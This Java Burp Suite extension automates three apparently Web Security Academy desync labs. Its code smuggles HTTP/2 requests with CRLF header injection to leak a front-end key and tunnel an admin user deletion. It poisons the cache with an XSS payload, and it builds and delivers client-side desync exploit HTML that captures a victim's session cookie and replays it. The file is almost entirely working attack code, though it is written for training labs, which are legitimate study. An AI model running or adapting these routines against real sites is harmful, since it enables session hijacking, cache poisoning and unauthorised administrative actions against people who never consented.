package beauty.burp;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.HttpMode;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.RequestOptions;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;

import javax.swing.BorderFactory;
import javax.swing.BoxLayout;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import static burp.api.montoya.http.HttpService.httpService;
import static burp.api.montoya.http.RequestOptions.requestOptions;
import static burp.api.montoya.http.message.HttpHeader.httpHeader;
import static burp.api.montoya.http.message.requests.HttpRequest.http2Request;
import static burp.api.montoya.http.message.requests.HttpRequest.httpRequest;

public class Http2TunnelSolverExtension implements BurpExtension, ContextMenuItemsProvider
{
    private enum SolverMode
    {
        ACCESS_CONTROL("Bypass Access Control"),
        CACHE_POISONING("Cache Poisoning XSS"),
        CLIENT_SIDE_DESYNC("Client-side Desync");

        private final String label;

        SolverMode(String label)
        {
            this.label = label;
        }

        @Override
        public String toString()
        {
            return label;
        }
    }

    private record PostInfo(int postId, String csrf, String sessionCookie, String analyticsCookie)
    {
    }

    private record ExploitServerInfo(String baseUrl, HttpService service)
    {
    }

    private static final class RawHttpResponse
    {
        private final int statusCode;
        private final Map<String, String> headers;
        private final byte[] body;

        private RawHttpResponse(int statusCode, Map<String, String> headers, byte[] body)
        {
            this.statusCode = statusCode;
            this.headers = headers;
            this.body = body;
        }
    }

    private static final Pattern SESSION_COOKIE_PATTERN = Pattern.compile("(?i)\\bsession=([^;\\s]+)");
    private static final Pattern ANALYTICS_COOKIE_PATTERN = Pattern.compile("(?i)\\b_lab_analytics=([^;\\s]+)");
    private static final Pattern FRONTEND_KEY_PATTERN = Pattern.compile("(?i)X-FRONTEND-KEY:\\s*([A-Za-z0-9._-]+)");
    private static final Pattern DELETE_PATH_PATTERN = Pattern.compile("/admin/delete\\?username=carlos\\b");
    private static final Pattern POST_ID_PATTERN = Pattern.compile("/en/post\\?postId=(\\d+)");
    private static final Pattern CSRF_INPUT_PATTERN = Pattern.compile("name=[\"']csrf[\"'][^>]*value=[\"']([^\"']+)[\"']", Pattern.CASE_INSENSITIVE);
    private static final Pattern EXPLOIT_SERVER_PATTERN = Pattern.compile("https://exploit-[^\"'\\s<>]+\\.exploit-server\\.net");
    private static final Pattern CONTENT_LENGTH_PATTERN = Pattern.compile("(?i)^Content-Length:\\s*(\\d+)$", Pattern.MULTILINE);
    private static final Pattern TUNNELLED_200_PATTERN = Pattern.compile("HTTP/1\\.1 200 OK");
    private static final Pattern COMMENT_MARKER_PATTERN = Pattern.compile("GET /capture-([A-Za-z0-9_-]+) HTTP/1\\.1");
    private static final DateTimeFormatter TIME_FORMAT = DateTimeFormatter.ofPattern("HH:mm:ss");
    private static final int[] LEAK_LENGTHS = {500, 300, 250, 220, 200, 190, 187, 180, 170, 160, 150};
    private static final String USER_AGENT =
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 " +
        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";

    private MontoyaApi api;
    private ExecutorService executor;

    private JTextField urlField;
    private JTextArea logArea;
    private JButton solveButton;
    private JComboBox<SolverMode> modeCombo;

    @Override
    public void initialize(MontoyaApi api)
    {
        this.api = api;
        this.executor = Executors.newSingleThreadExecutor();

        api.extension().setName("HTTP Desync Lab Solver");
        api.userInterface().registerSuiteTab("Desync Solver", buildUi());
        api.userInterface().registerContextMenuItemsProvider(this);
        api.extension().registerUnloadingHandler(() -> executor.shutdownNow());

        log("Extension loaded");
    }

    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event)
    {
        List<HttpRequestResponse> selected = event.selectedRequestResponses();
        if (selected == null || selected.isEmpty())
        {
            return List.of();
        }

        String baseUrl = toBaseUrl(selected.get(0).request().url());
        JMenuItem accessItem = new JMenuItem("Solve H2 tunnel access-control lab");
        accessItem.addActionListener(e -> launch(baseUrl, SolverMode.ACCESS_CONTROL));

        JMenuItem cacheItem = new JMenuItem("Solve H2 tunnel cache-poisoning lab");
        cacheItem.addActionListener(e -> launch(baseUrl, SolverMode.CACHE_POISONING));

        JMenuItem csdItem = new JMenuItem("Solve client-side desync lab");
        csdItem.addActionListener(e -> launch(baseUrl, SolverMode.CLIENT_SIDE_DESYNC));

        return List.of(accessItem, cacheItem, csdItem);
    }

    private Component buildUi()
    {
        JPanel root = new JPanel(new BorderLayout(8, 8));
        root.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        JPanel top = new JPanel();
        top.setLayout(new BoxLayout(top, BoxLayout.Y_AXIS));

        JPanel inputRow = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 0));
        inputRow.add(new JLabel("Lab URL"));

        urlField = new JTextField(52);
        inputRow.add(urlField);

        inputRow.add(new JLabel("Mode"));

        modeCombo = new JComboBox<>(SolverMode.values());
        inputRow.add(modeCombo);

        solveButton = new JButton("Solve");
        solveButton.addActionListener(e -> solveAsync(urlField.getText().trim(), selectedMode()));
        inputRow.add(solveButton);

        top.add(inputRow);

        logArea = new JTextArea();
        logArea.setEditable(false);
        logArea.setLineWrap(true);
        logArea.setWrapStyleWord(true);

        JScrollPane scrollPane = new JScrollPane(logArea);
        scrollPane.setPreferredSize(new Dimension(980, 520));

        root.add(top, BorderLayout.NORTH);
        root.add(scrollPane, BorderLayout.CENTER);

        api.userInterface().applyThemeToComponent(root);
        return root;
    }

    private void launch(String baseUrl, SolverMode mode)
    {
        setUrl(baseUrl);
        setMode(mode);
        solveAsync(baseUrl, mode);
    }

    private SolverMode selectedMode()
    {
        Object selected = modeCombo.getSelectedItem();
        return selected instanceof SolverMode ? (SolverMode) selected : SolverMode.ACCESS_CONTROL;
    }

    private void solveAsync(String baseUrl, SolverMode mode)
    {
        if (baseUrl == null || baseUrl.isBlank())
        {
            log("Provide a lab URL first");
            return;
        }

        setBusy(true);
        executor.submit(() -> {
            try
            {
                solve(baseUrl, mode);
            }
            catch (Exception ex)
            {
                log("Error: " + ex.getMessage());
                api.logging().logToError(ex);
            }
            finally
            {
                setBusy(false);
            }
        });
    }

    private void solve(String rawBaseUrl, SolverMode mode) throws Exception
    {
        String baseUrl = normalizeBaseUrl(rawBaseUrl);
        HttpService service = serviceFromBaseUrl(baseUrl);

        log("Target: " + baseUrl);
        log("Mode: " + mode);

        switch (mode)
        {
            case ACCESS_CONTROL -> solveAccessControlLab(baseUrl, service);
            case CACHE_POISONING -> solveCachePoisoningLab(baseUrl, service);
            case CLIENT_SIDE_DESYNC -> solveClientSideDesyncLab(baseUrl, service);
        }
    }

    private void solveAccessControlLab(String baseUrl, HttpService service)
    {
        String sessionCookie = fetchSessionCookie(service);
        String frontendKey = leakFrontendKey(service, sessionCookie);
        String deletePath = fetchDeletePath(service, frontendKey);
        sendDelete(service, frontendKey, deletePath);
        verifySolvedH2(baseUrl, service);
    }

    private void solveCachePoisoningLab(String baseUrl, HttpService service) throws InterruptedException
    {
        int homeContentLength = fetchHomeContentLength(service);
        int postId = findWorkingPostId(service);
        String cachebuster = "cb" + Long.toUnsignedString(System.nanoTime(), 36);
        String paddedPayload = buildPaddedPayload(homeContentLength);

        log("Baseline home Content-Length: " + homeContentLength);
        log("Working tunnel probe postId: " + postId);
        log("Cachebuster for verification: " + cachebuster);

        String probeResponse = tunnelViaPath(
            service,
            "/?cachebuster=2",
            "/post?postId=" + postId
        );
        if (!TUNNELLED_200_PATTERN.matcher(probeResponse).find())
        {
            throw new IllegalStateException("Tunnel probe did not expose a nested HTTP/1.1 200 response");
        }
        log("Tunnel probe succeeded");

        String verificationResponse = poisonWithPayload(service, "/?cachebuster=" + cachebuster, paddedPayload);
        if (!verificationResponse.contains("<script>alert(1)</script>"))
        {
            throw new IllegalStateException("XSS payload was not reflected in the tunnelled verification response");
        }
        log("Verification response contains the XSS payload");

        HttpResponse poisonedCacheResponse = sendSimpleH2Request(service, "GET", "/?cachebuster=" + cachebuster);
        if (!poisonedCacheResponse.bodyToString().contains("<script>alert(1)</script>"))
        {
            throw new IllegalStateException("Cache-busted verification request did not return the poisoned response");
        }
        log("Cache-busted homepage is poisoned");

        for (int attempt = 1; attempt <= 18; attempt++)
        {
            log("Poisoning / attempt " + attempt + "/18");
            poisonWithPayload(service, "/", paddedPayload);

            HttpResponse homeResponse = sendSimpleH2Request(service, "GET", "/");
            String homeBody = homeResponse.bodyToString();
            if (homeBody.contains("Congratulations, you solved the lab!"))
            {
                log("Lab solved: " + baseUrl);
                return;
            }

            if (homeBody.contains("<script>alert(1)</script>"))
            {
                log("Root path appears poisoned; waiting for victim");
            }
            else
            {
                log("Root path not visibly poisoned yet");
            }

            Thread.sleep(5_000);
        }

        log("Finished poisoning loop without seeing the solve banner");
    }

    private void solveClientSideDesyncLab(String baseUrl, HttpService service) throws Exception
    {
        confirmClientSideDesync(service);
        ExploitServerInfo exploitServer = findExploitServer(service);
        PostInfo post = fetchPostInfo(service);
        log("Using postId " + post.postId());

        int calibrationLength = calibrateCaptureLength(service, post);
        log("Calibrated comment capture length: " + calibrationLength);

        int[] victimLengths = buildVictimLengths(calibrationLength);
        log("Victim capture lengths: " + joinLengths(victimLengths));

        String exploitHtml = buildClientSideDesyncExploit(baseUrl, post, victimLengths);
        storeExploit(exploitServer, exploitHtml);
        deliverExploit(exploitServer);

        String victimSession = waitForVictimSession(service, exploitServer, post.postId(), victimLengths, 180_000L);
        if (victimSession == null)
        {
            throw new IllegalStateException("Victim session cookie was not captured from comments");
        }

        log("Victim session cookie: " + victimSession);
        accessVictimAccount(service, victimSession);
        verifySolvedH1(baseUrl, service, victimSession);
    }

    private void confirmClientSideDesync(HttpService service)
    {
        log("Confirming client-side desync vector");
        String outerBody = "GET /hopefully404 HTTP/1.1\r\nFoo: x";
        String first = rawPost("/", outerBody, true);
        String second = rawGet("/en", true);

        List<RawHttpResponse> responses = sendRawHttp1Sequence(service, List.of(first, second), 8_000);
        if (responses.size() < 2 || responses.get(1).statusCode != 404)
        {
            throw new IllegalStateException("Second response was not the expected 404 desync confirmation");
        }
        log("Client-side desync confirmed with 404 on the follow-up request");
    }

    private ExploitServerInfo findExploitServer(HttpService service)
    {
        log("Locating exploit server");
        HttpResponse response = sendSimpleH1Request(service, "GET", "/en");
        Matcher matcher = EXPLOIT_SERVER_PATTERN.matcher(response.bodyToString());
        if (!matcher.find())
        {
            throw new IllegalStateException("Exploit server URL not found on /en");
        }

        String exploitUrl = matcher.group();
        log("Exploit server: " + exploitUrl);
        return new ExploitServerInfo(exploitUrl, serviceFromBaseUrl(exploitUrl));
    }

    private PostInfo fetchPostInfo(HttpService service)
    {
        log("Fetching blog metadata");
        HttpResponse home = sendSimpleH1Request(service, "GET", "/en");
        String homeBody = home.bodyToString();

        Matcher postMatcher = POST_ID_PATTERN.matcher(homeBody);
        if (!postMatcher.find())
        {
            throw new IllegalStateException("Could not find a blog post link on /en");
        }

        int postId = Integer.parseInt(postMatcher.group(1));
        HttpResponse postResponse = sendSimpleH1Request(service, "GET", "/en/post?postId=" + postId);
        String postBody = postResponse.bodyToString();

        Matcher csrfMatcher = CSRF_INPUT_PATTERN.matcher(postBody);
        if (!csrfMatcher.find())
        {
            throw new IllegalStateException("Could not find comment CSRF token");
        }

        String sessionCookie = requireCookie(postResponse, "session");
        String analyticsCookie = requireCookie(postResponse, "_lab_analytics");
        return new PostInfo(postId, csrfMatcher.group(1), sessionCookie, analyticsCookie);
    }

    private int calibrateCaptureLength(HttpService service, PostInfo post) throws InterruptedException
    {
        log("Calibrating comment capture length using your own request");
        String commentPrefixBody = buildCommentFormBody(post.csrf(), post.postId());
        int base = commentPrefixBody.getBytes(StandardCharsets.UTF_8).length;

        for (int candidate = base + 24; candidate <= base + 280; candidate += 16)
        {
            String marker = "probe-" + candidate;
            String commentRequest = buildNestedCommentRequest(service, post, candidate, commentPrefixBody);
            String outer = rawPost("/", commentRequest, true);
            String followUp = rawGet("/capture-" + marker, false);
            sendRawHttp1Sequence(service, List.of(outer, followUp), 8_000);
            Thread.sleep(1_200);

            String comments = fetchPostComments(service, post.postId());
            if (comments.contains("/capture-" + marker))
            {
                log("Marker captured at length " + candidate);
                return candidate;
            }
        }

        throw new IllegalStateException("Could not calibrate a working comment capture length");
    }

    private int[] buildVictimLengths(int calibrationLength)
    {
        List<Integer> lengths = new ArrayList<>();
        for (int value = Math.max(220, calibrationLength + 32); value <= 1200; value += 80)
        {
            lengths.add(value);
        }

        if (!lengths.contains(1000))
        {
            lengths.add(1000);
        }

        lengths.sort(Integer::compareTo);
        int[] result = new int[lengths.size()];
        for (int i = 0; i < lengths.size(); i++)
        {
            result[i] = lengths.get(i);
        }
        return result;
    }

    private String buildClientSideDesyncExploit(String labUrl, PostInfo post, int[] lengths)
    {
        String targetOrigin = toBaseUrl(labUrl);
        String host = serviceFromBaseUrl(labUrl).host();
        String formBody = jsString(buildCommentFormBody(post.csrf(), post.postId()));
        String session = jsString(post.sessionCookie());
        String analytics = jsString(post.analyticsCookie());
        String lengthsLiteral = joinLengths(lengths);

        return "<script>\n" +
            "(async () => {\n" +
            "  const lab = " + jsQuote(targetOrigin) + ";\n" +
            "  const host = " + jsQuote(host) + ";\n" +
            "  const session = " + jsQuote(session) + ";\n" +
            "  const analytics = " + jsQuote(analytics) + ";\n" +
            "  const formBody = " + jsQuote(formBody) + ";\n" +
            "  const lengths = [" + lengthsLiteral + "];\n" +
            "  const sleep = ms => new Promise(r => setTimeout(r, ms));\n" +
            "  for (const len of lengths) {\n" +
            "    const prefix = `POST /en/post/comment HTTP/1.1\\r\\nHost: ${host}\\r\\nCookie: session=${session}; _lab_analytics=${analytics}\\r\\nContent-Length: ${len}\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nConnection: keep-alive\\r\\n\\r\\n${formBody}`;\n" +
            "    await fetch(lab + '/', {\n" +
            "      method: 'POST',\n" +
            "      body: prefix,\n" +
            "      mode: 'cors',\n" +
            "      credentials: 'include'\n" +
            "    }).catch(() => fetch(lab + `/capture-victim-${len}`, {\n" +
            "      mode: 'no-cors',\n" +
            "      credentials: 'include'\n" +
            "    }));\n" +
            "    await sleep(1400);\n" +
            "  }\n" +
            "})();\n" +
            "</script>";
    }

    private void storeExploit(ExploitServerInfo exploitServer, String html)
    {
        log("Storing exploit on the exploit server");
        HttpResponse root = sendSimpleAutoRequest(exploitServer.service(), "GET", "/");
        Map<String, String> fields = extractHiddenInputs(root.bodyToString());
        fields.put("urlIsHttps", "on");
        fields.put("responseFile", "/exploit");
        fields.put("responseHead", "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8");
        fields.put("responseBody", html);
        fields.put("formAction", "STORE");

        String body = formEncode(fields);
        HttpRequest request = httpRequest(exploitServer.service(),
            "POST / HTTP/1.1\r\n" +
                "Host: " + authority(exploitServer.service()) + "\r\n" +
                "User-Agent: " + USER_AGENT + "\r\n" +
                "Content-Type: application/x-www-form-urlencoded\r\n" +
                "Content-Length: " + body.getBytes(StandardCharsets.UTF_8).length + "\r\n" +
                "Connection: close\r\n\r\n" +
                body);
        sendAuto(request, 15_000);
    }

    private void deliverExploit(ExploitServerInfo exploitServer)
    {
        log("Delivering exploit to victim");
        sendSimpleAutoRequest(exploitServer.service(), "GET", "/deliver-to-victim");
    }

    private String waitForVictimSession(HttpService service, ExploitServerInfo exploitServer, int postId, int[] lengths, long timeoutMs) throws InterruptedException
    {
        log("Polling comments for a victim session cookie");
        long deadline = System.currentTimeMillis() + timeoutMs;
        long nextRedelivery = System.currentTimeMillis() + 20_000L;
        while (System.currentTimeMillis() < deadline)
        {
            String comments = fetchPostComments(service, postId);
            for (int length : lengths)
            {
                if (!comments.contains("/capture-victim-" + length))
                {
                    continue;
                }
                String victimSession = extractVictimSessionFromComments(comments);
                if (victimSession != null)
                {
                    return victimSession;
                }
            }

            if (System.currentTimeMillis() >= nextRedelivery)
            {
                log("Re-delivering exploit to victim");
                deliverExploit(exploitServer);
                nextRedelivery = System.currentTimeMillis() + 20_000L;
            }

            Thread.sleep(5_000);
        }
        return null;
    }

    private String extractVictimSessionFromComments(String commentsHtml)
    {
        Matcher matcher = Pattern.compile("Cookie:\\s*session=([A-Za-z0-9]+)", Pattern.CASE_INSENSITIVE).matcher(commentsHtml);
        if (matcher.find())
        {
            return matcher.group(1);
        }

        matcher = Pattern.compile("session=([A-Za-z0-9]{10,})").matcher(commentsHtml);
        if (matcher.find())
        {
            return matcher.group(1);
        }
        return null;
    }

    private void accessVictimAccount(HttpService service, String victimSession)
    {
        log("Accessing /my-account with the stolen victim cookie");
        HttpRequest request = httpRequest(service,
            "GET /my-account HTTP/1.1\r\n" +
                "Host: " + authority(service) + "\r\n" +
                "User-Agent: " + USER_AGENT + "\r\n" +
                "Cookie: session=" + victimSession + "\r\n" +
                "Connection: close\r\n\r\n");
        HttpResponse response = sendHttp1(request, 15_000).response();
        if (response == null)
        {
            throw new IllegalStateException("No response while replaying the victim cookie");
        }
        log("Victim /my-account status: " + response.statusCode());
    }

    private String buildNestedCommentRequest(HttpService service, PostInfo post, int captureLength, String commentBody)
    {
        return "POST /en/post/comment HTTP/1.1\r\n" +
            "Host: " + authority(service) + "\r\n" +
            "Cookie: session=" + post.sessionCookie() + "; _lab_analytics=" + post.analyticsCookie() + "\r\n" +
            "Content-Length: " + captureLength + "\r\n" +
            "Content-Type: application/x-www-form-urlencoded\r\n" +
            "Connection: keep-alive\r\n\r\n" +
            commentBody;
    }

    private String buildCommentFormBody(String csrf, int postId)
    {
        Map<String, String> form = new LinkedHashMap<>();
        form.put("csrf", csrf);
        form.put("postId", String.valueOf(postId));
        form.put("name", "wiener");
        form.put("email", "wiener@web-security-academy.net");
        form.put("website", "https://portswigger.net");
        form.put("comment", "");
        return formEncode(form);
    }

    private String fetchPostComments(HttpService service, int postId)
    {
        return sendSimpleH1Request(service, "GET", "/en/post?postId=" + postId).bodyToString();
    }

    private String rawPost(String path, String body, boolean keepAlive)
    {
        int contentLength = body.getBytes(StandardCharsets.UTF_8).length;
        return "POST " + path + " HTTP/1.1\r\n" +
            "Host: PLACEHOLDER\r\n" +
            "User-Agent: " + USER_AGENT + "\r\n" +
            "Connection: " + (keepAlive ? "keep-alive" : "close") + "\r\n" +
            "Content-Length: " + contentLength + "\r\n\r\n" +
            body;
    }

    private String rawGet(String path, boolean keepAlive)
    {
        return "GET " + path + " HTTP/1.1\r\n" +
            "Host: PLACEHOLDER\r\n" +
            "User-Agent: " + USER_AGENT + "\r\n" +
            "Connection: " + (keepAlive ? "keep-alive" : "close") + "\r\n\r\n";
    }

    private List<RawHttpResponse> sendRawHttp1Sequence(HttpService service, List<String> rawRequests, int timeoutMs)
    {
        try (SSLSocket socket = openTlsSocket(service, timeoutMs))
        {
            OutputStream out = socket.getOutputStream();
            InputStream in = socket.getInputStream();
            List<RawHttpResponse> responses = new ArrayList<>();

            for (String rawRequest : rawRequests)
            {
                String normalized = rawRequest.replace("Host: PLACEHOLDER", "Host: " + authority(service));
                out.write(normalized.getBytes(StandardCharsets.UTF_8));
                out.flush();
                responses.add(readRawHttpResponse(in, timeoutMs));
            }

            return responses;
        }
        catch (Exception ex)
        {
            throw new IllegalStateException("Raw HTTP/1 sequence failed: " + ex.getMessage(), ex);
        }
    }

    private String fetchSessionCookie(HttpService service)
    {
        log("Fetching homepage to establish session");
        HttpResponse homepage = sendSimpleH2Request(service, "GET", "/");
        String session = extractCookie(homepage, "session");
        if (session != null)
        {
            log("Session cookie: " + session);
            return session;
        }

        log("Homepage did not set a session cookie, trying /login");
        HttpResponse login = sendSimpleH2Request(service, "GET", "/login");
        session = extractCookie(login, "session");
        if (session != null)
        {
            log("Session cookie: " + session);
            return session;
        }

        throw new IllegalStateException("Could not obtain a session cookie from / or /login");
    }

    private String leakFrontendKey(HttpService service, String sessionCookie)
    {
        log("Leaking front-end auth headers");
        String body = "search=" + "A".repeat(620);
        String lastBodySnippet = "";

        for (int smuggledLength : LEAK_LENGTHS)
        {
            log("Trying smuggled Content-Length " + smuggledLength);

            List<HttpHeader> headers = new ArrayList<>();
            headers.add(pseudo(":method", "POST"));
            headers.add(pseudo(":path", "/"));
            headers.add(pseudo(":scheme", service.secure() ? "https" : "http"));
            headers.add(pseudo(":authority", authority(service)));
            headers.add(httpHeader("user-agent", USER_AGENT));
            headers.add(httpHeader("content-type", "application/x-www-form-urlencoded"));
            headers.add(httpHeader("cookie", "session=" + sessionCookie));
            headers.add(httpHeader(
                "foo: bar\r\nContent-Length: " + smuggledLength + "\r\n\r\nsearch=x",
                "xyz"
            ));

            HttpRequest request = http2Request(service, headers, body);
            HttpResponse response = sendH2(request, 20_000).response();
            if (response == null)
            {
                throw new IllegalStateException("No response while leaking front-end headers");
            }

            String responseBody = response.bodyToString();
            Matcher keyMatcher = FRONTEND_KEY_PATTERN.matcher(responseBody);
            if (keyMatcher.find())
            {
                String frontendKey = keyMatcher.group(1);
                log("Leaked X-FRONTEND-KEY: " + frontendKey);
                return frontendKey;
            }

            lastBodySnippet = snippetAroundSearchResult(responseBody);
        }

        throw new IllegalStateException("Could not leak X-FRONTEND-KEY. Last response snippet:\n" + lastBodySnippet);
    }

    private String fetchDeletePath(HttpService service, String frontendKey)
    {
        log("Tunnelling GET /admin");
        String backendRequest =
            "GET /admin HTTP/1.1\r\n" +
            "X-SSL-VERIFIED: 1\r\n" +
            "X-SSL-CLIENT-CN: administrator\r\n" +
            "X-FRONTEND-KEY: " + frontendKey + "\r\n";

        String responseBody = tunnelWithHeaderName(service, backendRequest);
        Matcher matcher = DELETE_PATH_PATTERN.matcher(responseBody);
        if (!matcher.find())
        {
            throw new IllegalStateException("Delete path not found in tunnelled /admin response:\n" + responseBody);
        }

        String deletePath = matcher.group();
        log("Found delete path: " + deletePath);
        return deletePath;
    }

    private void sendDelete(HttpService service, String frontendKey, String deletePath)
    {
        log("Tunnelling delete request");
        String backendRequest =
            "GET " + deletePath + " HTTP/1.1\r\n" +
            "X-SSL-VERIFIED: 1\r\n" +
            "X-SSL-CLIENT-CN: administrator\r\n" +
            "X-FRONTEND-KEY: " + frontendKey + "\r\n";

        tunnelWithHeaderName(service, backendRequest);
        log("Delete request sent");
    }

    private String tunnelWithHeaderName(HttpService service, String backendRequest)
    {
        List<HttpHeader> headers = new ArrayList<>();
        headers.add(pseudo(":method", "HEAD"));
        headers.add(pseudo(":path", "/login"));
        headers.add(pseudo(":scheme", service.secure() ? "https" : "http"));
        headers.add(pseudo(":authority", authority(service)));
        headers.add(httpHeader("user-agent", USER_AGENT));
        headers.add(httpHeader("foo: bar\r\n\r\n" + backendRequest + "\r\n", "xyz"));

        HttpRequest request = http2Request(service, headers, "");
        HttpResponse response = sendH2(request, 20_000).response();
        if (response == null)
        {
            throw new IllegalStateException("No response while tunnelling request");
        }

        log("Tunnel outer status: " + response.statusCode());
        return response.bodyToString();
    }

    private int fetchHomeContentLength(HttpService service)
    {
        log("Fetching baseline homepage response");
        HttpResponse response = sendSimpleH2Request(service, "GET", "/");
        String contentLength = response.headerValue("Content-Length");
        if (contentLength != null && !contentLength.isBlank())
        {
            return Integer.parseInt(contentLength.trim());
        }

        int inferred = response.body().length();
        log("Content-Length header missing, inferred from body length: " + inferred);
        return inferred;
    }

    private int findWorkingPostId(HttpService service)
    {
        log("Looking for a tunnel-visible blog post");
        for (int postId = 1; postId <= 10; postId++)
        {
            String response = tunnelViaPath(service, "/?cachebuster=probe" + postId, "/post?postId=" + postId);
            if (TUNNELLED_200_PATTERN.matcher(response).find())
            {
                return postId;
            }
        }

        throw new IllegalStateException("Could not find a working postId for the tunnel probe");
    }

    private String buildPaddedPayload(int homeContentLength)
    {
        int padding = Math.max(homeContentLength + 512, 4096);
        String payload = "<script>alert(1)</script>" + "A".repeat(padding);
        log("Using XSS padding length: " + padding);
        return payload;
    }

    private String poisonWithPayload(HttpService service, String visiblePath, String payload)
    {
        String tunneledPath = "/resources?" + payload;
        return tunnelViaPath(service, visiblePath, tunneledPath);
    }

    private String tunnelViaPath(HttpService service, String visiblePath, String tunneledPath)
    {
        String injectedPath =
            visiblePath + " HTTP/1.1\r\n" +
            "Host: " + authority(service) + "\r\n" +
            "\r\n" +
            "GET " + tunneledPath + " HTTP/1.1\r\n" +
            "Foo: bar";

        List<HttpHeader> headers = new ArrayList<>();
        headers.add(pseudo(":method", "HEAD"));
        headers.add(pseudo(":path", injectedPath));
        headers.add(pseudo(":scheme", service.secure() ? "https" : "http"));
        headers.add(pseudo(":authority", authority(service)));
        headers.add(httpHeader("user-agent", USER_AGENT));

        HttpRequest request = http2Request(service, headers, "");
        HttpResponse response = sendH2(request, 20_000).response();
        if (response == null)
        {
            throw new IllegalStateException("No response while tunnelling via :path");
        }

        log("Tunnel outer status: " + response.statusCode());
        return response.bodyToString();
    }

    private HttpResponse sendSimpleH2Request(HttpService service, String method, String path)
    {
        HttpRequest request = http2Request(service, List.of(
            pseudo(":method", method),
            pseudo(":path", path),
            pseudo(":scheme", service.secure() ? "https" : "http"),
            pseudo(":authority", authority(service)),
            httpHeader("user-agent", USER_AGENT)
        ), "");

        HttpResponse response = sendH2(request, 20_000).response();
        if (response == null)
        {
            throw new IllegalStateException("No response for " + method + " " + path);
        }
        return response;
    }

    private HttpResponse sendSimpleH1Request(HttpService service, String method, String path)
    {
        HttpRequest request = httpRequest(service,
            method + " " + path + " HTTP/1.1\r\n" +
                "Host: " + authority(service) + "\r\n" +
                "User-Agent: " + USER_AGENT + "\r\n" +
                "Connection: close\r\n\r\n");
        HttpResponse response = sendHttp1(request, 15_000).response();
        if (response == null)
        {
            throw new IllegalStateException("No response for " + method + " " + path);
        }
        return response;
    }

    private HttpResponse sendSimpleAutoRequest(HttpService service, String method, String path)
    {
        HttpRequest request = httpRequest(service,
            method + " " + path + " HTTP/1.1\r\n" +
                "Host: " + authority(service) + "\r\n" +
                "User-Agent: " + USER_AGENT + "\r\n" +
                "Connection: close\r\n\r\n");
        HttpResponse response = sendAuto(request, 15_000).response();
        if (response == null)
        {
            throw new IllegalStateException("No response for " + method + " " + path);
        }
        return response;
    }

    private HttpRequestResponse sendH2(HttpRequest request, long timeoutMs)
    {
        RequestOptions options = requestOptions()
            .withHttpMode(HttpMode.HTTP_2_IGNORE_ALPN)
            .withResponseTimeout(timeoutMs);
        return api.http().sendRequest(request, options);
    }

    private HttpRequestResponse sendHttp1(HttpRequest request, long timeoutMs)
    {
        RequestOptions options = requestOptions()
            .withHttpMode(HttpMode.HTTP_1)
            .withResponseTimeout(timeoutMs);
        return api.http().sendRequest(request, options);
    }

    private HttpRequestResponse sendAuto(HttpRequest request, long timeoutMs)
    {
        RequestOptions options = requestOptions().withResponseTimeout(timeoutMs);
        return api.http().sendRequest(request, options);
    }

    private HttpHeader pseudo(String name, String value)
    {
        return httpHeader(name, value);
    }

    private String requireCookie(HttpResponse response, String name)
    {
        String value = extractCookie(response, name);
        if (value == null || value.isBlank())
        {
            throw new IllegalStateException("Cookie not found: " + name);
        }
        return value;
    }

    private String extractCookie(HttpResponse response, String name)
    {
        String direct = response.cookieValue(name);
        if (direct != null && !direct.isBlank())
        {
            return direct;
        }

        Pattern pattern = switch (name)
        {
            case "session" -> SESSION_COOKIE_PATTERN;
            case "_lab_analytics" -> ANALYTICS_COOKIE_PATTERN;
            default -> Pattern.compile("(?i)\\b" + Pattern.quote(name) + "=([^;\\s]+)");
        };

        String setCookie = response.headerValue("Set-Cookie");
        if (setCookie != null)
        {
            Matcher matcher = pattern.matcher(setCookie);
            if (matcher.find())
            {
                return matcher.group(1);
            }
        }

        for (HttpHeader header : response.headers())
        {
            if (!"set-cookie".equalsIgnoreCase(header.name()))
            {
                continue;
            }
            Matcher matcher = pattern.matcher(header.value());
            if (matcher.find())
            {
                return matcher.group(1);
            }
        }

        return null;
    }

    private Map<String, String> extractHiddenInputs(String html)
    {
        Map<String, String> fields = new LinkedHashMap<>();
        Matcher matcher = Pattern.compile("<input[^>]*type=[\"']hidden[\"'][^>]*name=[\"']([^\"']+)[\"'][^>]*value=[\"']([^\"']*)[\"'][^>]*>", Pattern.CASE_INSENSITIVE).matcher(html);
        while (matcher.find())
        {
            fields.put(matcher.group(1), matcher.group(2));
        }
        return fields;
    }

    private String formEncode(Map<String, String> fields)
    {
        List<String> parts = new ArrayList<>();
        for (Map.Entry<String, String> entry : fields.entrySet())
        {
            parts.add(urlEncode(entry.getKey()) + "=" + urlEncode(entry.getValue()));
        }
        return String.join("&", parts);
    }

    private String urlEncode(String value)
    {
        return URLEncoder.encode(value, StandardCharsets.UTF_8).replace("+", "%20");
    }

